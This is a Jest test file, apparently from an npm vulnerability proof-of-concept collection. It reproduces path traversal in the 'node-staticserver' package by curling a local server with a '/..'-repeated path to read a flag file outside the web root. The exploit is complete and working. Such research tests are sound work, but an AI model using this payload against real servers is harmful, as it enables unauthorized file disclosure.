//https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/node-staticserver/test.js
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in node-staticserver", (done) => {
    const pkg = require('node-staticserver');
    const fs = require("fs");
    const { exec } = require("child_process");
    let hostsFile = fs.readFileSync(pathToFlag).toString();

    let app = pkg();
    app.listen(8983);

    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8983${genstr()}"`;

    exec(attack_string, (error, stdout) => {
        expect(stdout).toBe(hostsFile);
        done();
    });
});
